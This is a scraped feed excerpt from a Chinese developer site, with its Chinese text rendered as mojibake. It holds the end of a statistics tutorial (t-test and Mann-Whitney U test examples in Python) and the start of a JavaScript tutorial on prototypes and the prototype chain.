<span class="hljs-built_in">print</span>(<span class="hljs-string">f"På€¼: <span class="hljs-subst">{p_val:<span class="hljs-number">.5</span>f}</span>"</span>)

<span class="hljs-comment"># 3. åˆ¤æ–­ç»“è®º</span>
alpha = <span class="hljs-number">0.05</span>
<span class="hljs-keyword">if</span> p_val &lt; alpha:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“è®ºï¼šæ‹’ç»åŸå‡è®¾ã€‚çº¢è‰²æŒ‰é’®å¸¦æ¥çš„æ¶ˆè´¹æå‡æ˜¯ã€ç»Ÿè®¡æ˜¾è‘—ã€‘çš„ï¼Œå»ºè®®å…¨é‡ä¸Šçº¿ï¼"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“è®ºï¼šæ— æ³•æ‹’ç»åŸå‡è®¾ã€‚ä¸¤ç»„å·®å¼‚å¯èƒ½æ˜¯è¯¯å·®å¯¼è‡´çš„ï¼Œå»ºè®®ç»´æŒåŸçŠ¶ã€‚"</span>)

<span class="hljs-comment"># è¿è¡Œç»“æœï¼š</span>
<span class="hljs-string">'''
På€¼: 0.00000
ç»“è®ºï¼šæ‹’ç»åŸå‡è®¾ã€‚çº¢è‰²æŒ‰é’®å¸¦æ¥çš„æ¶ˆè´¹æå‡æ˜¯ã€ç»Ÿè®¡æ˜¾è‘—ã€‘çš„ï¼Œå»ºè®®å…¨é‡ä¸Šçº¿ï¼
'''</span>
</code></pre>
<p>å›¾å½¢åŒ–ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/007a998a5b334cc1983d927a81d5cb52~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765801601&amp;x-signature=m5GveoNuTzkuYjkksK1WM8NmpFY%3D" alt="" loading="lazy"/></p>
<p>ä»å›¾ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œä¸¤æ¡æ›²çº¿ï¼ˆçº¢è‰²å’Œè“è‰²ï¼‰å…¶å®é‡å åº¦å¾ˆé«˜ã€‚</p>
<p>å¯¹äºæ–°æ‰‹ï¼Œçœ‹åˆ°è¿™ä¸ªå›¾ï¼Œå¯èƒ½ä¼šé™·å…¥ä¸€ä¸ªè¯¯åŒºï¼Œè§‰å¾—â€œè¿™ä¸¤åº§å±±å³°çœ‹èµ·æ¥å·®ä¸å¤šå˜›ï¼Œæ²¡å•¥åŒºåˆ«â€ã€‚</p>
<p>ä½†åœ¨ç»Ÿè®¡å­¦ä¸Šï¼Œä¸¤åº§å±±å³°çš„ <strong>â€œé‡å¿ƒâ€</strong> ï¼ˆå‡å€¼ï¼‰å‘ç”Ÿäº† <strong>æ˜¾è‘—åç§»</strong> ã€‚è¿™å°±æ˜¯å‡è®¾æ£€éªŒçš„å¨åŠ›--åœ¨é‡å çš„å™ªå£°ä¸­è¯†åˆ«å‡ºåç§»çš„ä¿¡å·ã€‚</p>
<h2 data-id="heading-2">3. éå‚æ•°ä¼°è®¡</h2>
<p>å‰é¢çš„ <strong>â€œå‚æ•°ä¼°è®¡â€</strong> å’Œ <strong>â€œTæ£€éªŒâ€</strong> éƒ½æœ‰ä¸€ä¸ªå¨‡æ°”çš„è„¾æ°”ï¼šå®ƒä»¬é€šå¸¸å‡è®¾æ•°æ®æ˜¯æœä» <strong>â€œæ­£æ€åˆ†å¸ƒâ€</strong> çš„ï¼ˆä¹Ÿå°±æ˜¯æ¼‚äº®çš„é’Ÿå½¢æ›²çº¿ï¼‰ã€‚</p>
<p>ä½†åœ¨ç°å®ç”Ÿæ´»ä¸­ï¼Œå¾ˆå¤šæ•°æ®å¹¶ä¸æ­£æ€ï¼Œæˆ–è€…æ•°æ®ç”šè‡³æ˜¯å®šåºçš„ï¼ˆæ¯”å¦‚ï¼šéå¸¸æ»¡æ„ã€æ»¡æ„ã€ä¸€èˆ¬ã€ä¸æ»¡æ„ï¼‰ã€‚</p>
<p>è¿™æ—¶å€™ï¼Œä¼ ç»Ÿçš„ <strong>Tæ£€éªŒ</strong> å°±å¤±æ•ˆäº†ï¼Œæˆ‘ä»¬éœ€è¦è¯·å‡º <strong>éå‚æ•°æ£€éªŒ</strong> ã€‚</p>
<p>å®ƒä¸ä¾èµ–æ•°æ®çš„åˆ†å¸ƒå½¢çŠ¶ï¼Œéå¸¸æŠ—é€ ã€‚</p>
<p>å‡è®¾æˆ‘ä»¬è¦å¯¹æ¯”ä¸¤æ¬¾æ‰‹æ¸¸ã€Šç‹è€…è£è€€ã€‹å’Œã€ŠåŸç¥ã€‹ç©å®¶æ¯å¤©çš„æ¸¸ç©æ—¶é•¿ã€‚</p>
<p>ç”±äºã€ŠåŸç¥ã€‹ç©å®¶å¯èƒ½å­˜åœ¨å¤§é‡çš„â€œé•¿å°¾â€ç”¨æˆ·ï¼ˆç©ç‰¹åˆ«ä¹…ï¼‰ï¼Œæ•°æ®å¾€å¾€æ˜¯ä¸¥é‡å³åçš„ï¼Œä¸ç¬¦åˆæ­£æ€åˆ†å¸ƒã€‚</p>
<p>è¿™æ—¶å€™å¯¹æ¯”ä¸¤ç»„æ•°æ®å·®å¼‚ï¼Œå°±ä¸èƒ½ç”¨<strong>Tæ£€éªŒ</strong>ï¼Œæˆ‘ä»¬ä½¿ç”¨<strong>éå‚æ•°ä¼°è®¡</strong>ä¸­çš„ä¸€ç§æ–¹å¼ï¼šæ›¼-æƒ ç‰¹å°¼Uæ£€éªŒ (Mann-Whitney U test)ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 1. æ¨¡æ‹Ÿéæ­£æ€åˆ†å¸ƒæ•°æ® (ä½¿ç”¨æŒ‡æ•°åˆ†å¸ƒæ¨¡æ‹Ÿç”±åæ•°æ®)</span>
<span class="hljs-comment"># æ¸¸æˆAï¼šå¹³å‡æ—¶é•¿è¾ƒçŸ­</span>
game_a_hours = np.random.exponential(scale=<span class="hljs-number">1.0</span>, size=<span class="hljs-number">100</span>)
<span class="hljs-comment"># æ¸¸æˆBï¼šå¹³å‡æ—¶é•¿è¾ƒé•¿</span>
game_b_hours = np.random.exponential(scale=<span class="hljs-number">1.5</span>, size=<span class="hljs-number">100</span>)

<span class="hljs-comment"># 2. é¦–å…ˆï¼Œæ£€æŸ¥ä¸€ä¸‹æ­£æ€æ€§ (Shapiro-Wilkæ£€éªŒ)</span>
<span class="hljs-comment"># å¦‚æœP &lt; 0.05ï¼Œè¯´æ˜ä¸æ˜¯æ­£æ€åˆ†å¸ƒ</span>
_, p_norm_a = stats.shapiro(game_a_hours)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"æ¸¸æˆAæ­£æ€æ€§æ£€éªŒPå€¼: <span class="hljs-subst">{p_norm_a:<span class="hljs-number">.4</span>f}</span> (å°äº0.05åˆ™éæ­£æ€)"</span>)

<span class="hljs-comment"># 3. ä½¿ç”¨éå‚æ•°æ£€éªŒï¼šMann-Whitney Uæ£€éªŒ</span>
<span class="hljs-comment"># å®ƒå¯ä»¥æ¯”è¾ƒä¸¤ä¸ªç‹¬ç«‹æ ·æœ¬çš„åˆ†å¸ƒæ˜¯å¦å­˜åœ¨å·®å¼‚ï¼ˆä¾§é‡äºä¸­ä½æ•°/ç§©æ¬¡çš„æ¯”è¾ƒï¼‰</span>
u_stat, p_val_nonparam = stats.mannwhitneyu(game_a_hours, game_b_hours, alternative=<span class="hljs-string">'two-sided'</span>)

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"Mann-Whitney Uæ£€éªŒ På€¼: <span class="hljs-subst">{p_val_nonparam:<span class="hljs-number">.5</span>f}</span>"</span>)

<span class="hljs-keyword">if</span> p_val_nonparam &lt; <span class="hljs-number">0.05</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“è®ºï¼šä¸¤æ¬¾æ¸¸æˆçš„ç©å®¶æ¸¸ç©æ—¶é•¿åˆ†å¸ƒå­˜åœ¨æ˜¾è‘—å·®å¼‚ã€‚"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"ç»“è®ºï¼šä¸¤æ¬¾æ¸¸æˆç©å®¶æ¸¸ç©æ—¶é•¿æ— æ˜¾è‘—å·®å¼‚ã€‚"</span>)

<span class="hljs-comment"># è¿è¡Œç»“æœï¼š</span>
<span class="hljs-string">'''
æ¸¸æˆAæ­£æ€æ€§æ£€éªŒPå€¼: 0.0000 (å°äº0.05åˆ™éæ­£æ€)
Mann-Whitney Uæ£€éªŒ På€¼: 0.00003
ç»“è®ºï¼šä¸¤æ¬¾æ¸¸æˆçš„ç©å®¶æ¸¸ç©æ—¶é•¿åˆ†å¸ƒå­˜åœ¨æ˜¾è‘—å·®å¼‚ã€‚
'''</span>
</code></pre>
<p>å¯è§†åŒ–ç»“æœå¦‚ä¸‹ï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/93946f2319514f0799b428ff9ce98157~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgZGF0YWJvb2s=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765801601&amp;x-signature=YIoZEwYKr5SHRNZpgn1OoZhSI24%3D" alt="" loading="lazy"/></p>
<p>å°½ç®¡æ•°æ®é•¿å¾—æ­ªç“œè£‚æ£ï¼ˆä¸¥é‡å³åï¼‰ï¼Œ<strong>Uæ£€éªŒ</strong>ä¾ç„¶ç¨³å¥åœ°å‘Šè¯‰æˆ‘ä»¬ï¼š<strong>è¿™ä¸¤ç»„æ•°æ®ä¸ä¸€æ ·</strong>ã€‚</p>
<p><strong>Uæ£€éªŒ</strong>æ¯”è¾ƒçš„ä¸ä»…ä»…æ˜¯å¹³å‡å€¼ï¼Œå®ƒæ›´å¤šæ˜¯åœ¨æ¯”è¾ƒ <strong>â€œç§©æ¬¡â€</strong>ï¼ˆ<code>Ranking</code>ï¼‰ã€‚</p>
<p>é€šä¿—ç‚¹è¯´ï¼Œå®ƒå‘ç°å¦‚æœæˆ‘ä»¬æŠŠä¸¤ç»„ç©å®¶æ··åœ¨ä¸€èµ·æ’åï¼Œ<code>Game B</code>çš„ç©å®¶å³ä½¿ä¸çœ‹å…·ä½“æ—¶é•¿ï¼Œæ’åä¹Ÿæ™®éæ¯”<code>Game A</code>çš„ç©å®¶é å‰ã€‚</p>
<p>ä»å›¾ä¸­æ¥çœ‹ï¼Œä½ ä¼šçœ‹åˆ°æ©™è‰²ï¼ˆ<code>Game B</code>ï¼‰çš„å°¾å·´æ˜æ˜¾æ¯”è“è‰²ï¼ˆ<code>Game A</code>ï¼‰æ‹–å¾—æ›´é•¿ã€æ›´åšå®ã€‚</p>
<p>è¿™è¯´æ˜<code>Game B</code>ï¼ˆæ¯”å¦‚ã€ŠåŸç¥ã€‹ï¼‰æ›´å®¹æ˜“è®©ç©å®¶æ²‰æµ¸æ›´ä¹…ï¼Œæˆ–è€…æ‹¥æœ‰æ›´å¤šçš„é‡åº¦ç©å®¶ã€‚</p>
<h2 data-id="heading-3">4. æ€»ç»“</h2>
<p>æ­å–œä½ ï¼ä½ å·²ç»æŒæ¡äº†æ•°æ®<strong>æ¨æ–­åˆ†æ</strong>çš„æ ¸å¿ƒé€»è¾‘ï¼š</p>
<ol>
<li><strong>å‚æ•°ä¼°è®¡</strong>ï¼šå½“ä½ åªæœ‰æ ·æœ¬ï¼Œæƒ³çŸ¥é“æ€»ä½“çš„æ•°å€¼èŒƒå›´æ—¶ä½¿ç”¨ã€‚ï¼ˆæ¯”å¦‚ä¼°ç®—å¹³å‡è–ªèµ„ï¼‰</li>
<li><strong>å‡è®¾æ£€éªŒ</strong>ï¼šå½“ä½ æ•°æ®æ¯”è¾ƒâ€œå®Œç¾â€ï¼ˆæ­£æ€åˆ†å¸ƒï¼‰ï¼Œæƒ³åˆ¤æ–­å·®å¼‚æ˜¯ä¸æ˜¯çœŸçš„æ—¶ä½¿ç”¨ã€‚ï¼ˆæ¯”å¦‚A/Bæµ‹è¯•ï¼‰</li>
<li><strong>éå‚æ•°æ£€éªŒ</strong>ï¼šå½“ä½ æ•°æ®åˆ†å¸ƒå¥‡æ€ªã€æˆ–è€…åªæœ‰æ’å/ç­‰çº§æ•°æ®æ—¶ä½¿ç”¨ã€‚ï¼ˆæ¯”å¦‚è¯„åˆ†å¯¹æ¯”ã€é•¿å°¾æ•°æ®åˆ†æï¼‰</li>
</ol>
<p>è¿™<strong>ä¸‰æ¿æ–§</strong>æ˜¯æ•°æ®åˆ†æå¸ˆè¡Œèµ°æ±Ÿæ¹–çš„å¿…å¤‡æŠ€èƒ½ã€‚æŒæ¡äº†å®ƒä»¬ï¼Œä½ å°±ä¸ä»…ä»…æ˜¯ä¸€ä¸ªâ€œåšè¡¨çš„â€ï¼Œè€Œæ˜¯ä¸€ä¸ªèƒ½ä»æ•°æ®ä¸­æŒ–æ˜çœŸç›¸çš„â€œä¾¦æ¢â€ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA["è®²è®²åŸå‹é“¾" â€”â€” é¢è¯•å®˜æœ€çˆ±é—®çš„ JavaScript åŸºç¡€]]></title>    <link>https://juejin.cn/post/7581324171398479918</link>    <guid>https://juejin.cn/post/7581324171398479918</guid>    <pubDate>2025-12-08T14:25:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581324171398479918" data-draft-id="7581292270961754122" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="&quot;è®²è®²åŸå‹é“¾&quot; â€”â€” é¢è¯•å®˜æœ€çˆ±é—®çš„ JavaScript åŸºç¡€"/> <meta itemprop="keywords" content="JavaScript,å‰ç«¯,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-08T14:25:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´"/> <meta itemprop="url" content="https://juejin.cn/user/2175258804632332"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            "è®²è®²åŸå‹é“¾" â€”â€” é¢è¯•å®˜æœ€çˆ±é—®çš„ JavaScript åŸºç¡€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2175258804632332/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹Ÿæ— é£é›¨ä¹Ÿé›¾æ™´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T14:25:25.000Z" title="Mon Dec 08 2025 14:25:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JavaScript åŸå‹ä¸åŸå‹é“¾ï¼šä»å›°æƒ‘åˆ°å®Œå…¨ç†è§£</h2>
<p>ä»¥å‰åœ¨çœ‹ JavaScript ä»£ç çš„æ—¶å€™ï¼Œç»å¸¸ä¼šé‡åˆ°ä¸€ä¸ªé—®é¢˜ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> arr = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
arr.<span class="hljs-title function_">push</span>(<span class="hljs-number">4</span>);      <span class="hljs-comment">// 4</span>
arr.<span class="hljs-title function_">join</span>(<span class="hljs-string">','</span>);    <span class="hljs-comment">// "1,2,3,4"</span>
arr.<span class="hljs-title function_">toString</span>();   <span class="hljs-comment">// "1,2,3,4"</span>
</code></pre>
<p>æˆ‘æ˜æ˜åªåˆ›å»ºäº†ä¸€ä¸ªæ•°ç»„ï¼Œä¸ºä»€ä¹ˆå®ƒèƒ½è°ƒç”¨ <code>push</code>ã€<code>join</code>ã€<code>toString</code> è¿™äº›æ–¹æ³•ï¼Ÿè¿™äº›æ–¹æ³•æ˜¯ä»å“ªæ¥çš„ï¼Ÿ</p>
<p>å†çœ‹è¿™æ®µä»£ç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'å¼ ä¸‰'</span>);
person.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// "Hello, I'm å¼ ä¸‰"</span>
</code></pre>
<p><code>person</code> å¯¹è±¡æœ¬èº«æ²¡æœ‰ <code>sayHello</code> æ–¹æ³•ï¼Œä½†å´èƒ½è°ƒç”¨å®ƒã€‚è¿™èƒŒåçš„æœºåˆ¶å°±æ˜¯åŸå‹é“¾ã€‚</p>
<hr/>
<h3 data-id="heading-1">å…ˆææ¸…æ¥šå‡ ä¸ªæ¦‚å¿µ</h3>
<p>åœ¨æ·±å…¥ä¹‹å‰ï¼Œå…ˆæŠŠå‡ ä¸ªå®¹æ˜“æ··æ·†çš„æ¦‚å¿µç†æ¸…æ¥šï¼š</p>
<h4 data-id="heading-2"><code>[[Prototype]]</code>ã€<code>__proto__</code>ã€<code>prototype</code> çš„åŒºåˆ«</h4>





























<table><thead><tr><th>æ¦‚å¿µ</th><th>æ˜¯ä»€ä¹ˆ</th><th>å±äºè°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>[[Prototype]]</code></td><td>å†…éƒ¨å±æ€§</td><td>æ‰€æœ‰å¯¹è±¡</td><td>æŒ‡å‘å¯¹è±¡çš„åŸå‹ï¼Œéšè—å±æ€§</td></tr><tr><td><code>__proto__</code></td><td>è®¿é—®å™¨å±æ€§</td><td>æ‰€æœ‰å¯¹è±¡</td><td>æš´éœ² <code>[[Prototype]]</code>ï¼Œéæ ‡å‡†ä½†å¹¿æ³›æ”¯æŒ</td></tr><tr><td><code>prototype</code></td><td>æ™®é€šå±æ€§</td><td>å‡½æ•°</td><td>å­˜æ”¾ç»™å®ä¾‹å…±äº«çš„å±æ€§å’Œæ–¹æ³•</td></tr></tbody></table>
<p>ç®€å•è¯´ï¼š</p>
<ul>
<li><strong><code>prototype</code></strong> æ˜¯<strong>å‡½æ•°</strong>æ‰æœ‰çš„å±æ€§ï¼Œç”¨æ¥å­˜æ”¾å…±äº«æ–¹æ³•</li>
<li><strong><code>__proto__</code></strong> æ˜¯<strong>æ‰€æœ‰å¯¹è±¡</strong>éƒ½æœ‰çš„å±æ€§ï¼ŒæŒ‡å‘å®ƒçš„åŸå‹å¯¹è±¡</li>
<li><strong><code>[[Prototype]]</code></strong> æ˜¯ <code>__proto__</code> çš„å†…éƒ¨å®ç°</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Foo</span>(<span class="hljs-params"/>) {}
<span class="hljs-keyword">const</span> foo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Foo</span>();

<span class="hljs-comment">// prototype åªæœ‰å‡½æ•°æ‰æœ‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);      <span class="hljs-comment">// {constructor: Æ’}</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);      <span class="hljs-comment">// undefined</span>

<span class="hljs-comment">// __proto__ æ‰€æœ‰å¯¹è±¡éƒ½æœ‰</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(foo.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);  <span class="hljs-comment">// true</span>
</code></pre>
<h4 data-id="heading-3">ç°ä»£å†™æ³•ï¼šObject.getPrototypeOf()</h4>
<p><code>__proto__</code> è™½ç„¶å¥½ç”¨ï¼Œä½†å®ƒä¸æ˜¯ ECMAScript æ ‡å‡†çš„ä¸€éƒ¨åˆ†ï¼Œåªæ˜¯å„æµè§ˆå™¨éƒ½å®ç°äº†ã€‚æ¨èç”¨æ ‡å‡†æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è·å–åŸå‹</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getPrototypeOf</span>(foo) === <span class="hljs-title class_">Foo</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>  <span class="hljs-comment">// true</span>

<span class="hljs-comment">// è®¾ç½®åŸå‹</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">setPrototypeOf</span>(obj, prototype)

<span class="hljs-comment">// åˆ›å»ºæ—¶æŒ‡å®šåŸå‹</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(prototype)
</code></pre>
<hr/>
<h3 data-id="heading-4">åŸå‹æ˜¯ä»€ä¹ˆ</h3>
<p>JavaScript é‡Œæ¯ä¸ªå‡½æ•°éƒ½æœ‰ä¸€ä¸ª <code>prototype</code> å±æ€§ï¼ŒæŒ‡å‘ä¸€ä¸ªå¯¹è±¡ã€‚è¿™ä¸ªå¯¹è±¡å«åš<strong>åŸå‹å¯¹è±¡</strong>ï¼Œå®ƒçš„ä½œç”¨æ˜¯è®©è¯¥å‡½æ•°åˆ›å»ºçš„æ‰€æœ‰å®ä¾‹å…±äº«å±æ€§å’Œæ–¹æ³•ã€‚</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Car</span>(<span class="hljs-params">brand</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">brand</span> = brand;
}

<span class="hljs-comment">// æ–¹æ³•å®šä¹‰åœ¨åŸå‹ä¸Šï¼Œæ‰€æœ‰å®ä¾‹å…±äº«</span>
<span class="hljs-title class_">Car</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">start</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.brand}</span> å¯åŠ¨äº†`</span>);
};

<span class="hljs-keyword">const</span> car1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">'ä¸°ç”°'</span>);
<span class="hljs-keyword">const</span> car2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Car</span>(<span class="hljs-string">'æœ¬ç”°'</span>);

car1.<span class="hljs-title function_">start</span>(); <span class="hljs-comment">// ä¸°ç”° å¯åŠ¨äº†</span>
car2.<span class="hljs-title function_">start</span>(); <span class="hljs-comment">// æœ¬ç”° å¯åŠ¨äº†</span>

<span class="hljs-comment">// ä¸¤ä¸ªå®ä¾‹ç”¨çš„æ˜¯åŒä¸€ä¸ªæ–¹æ³•</span>
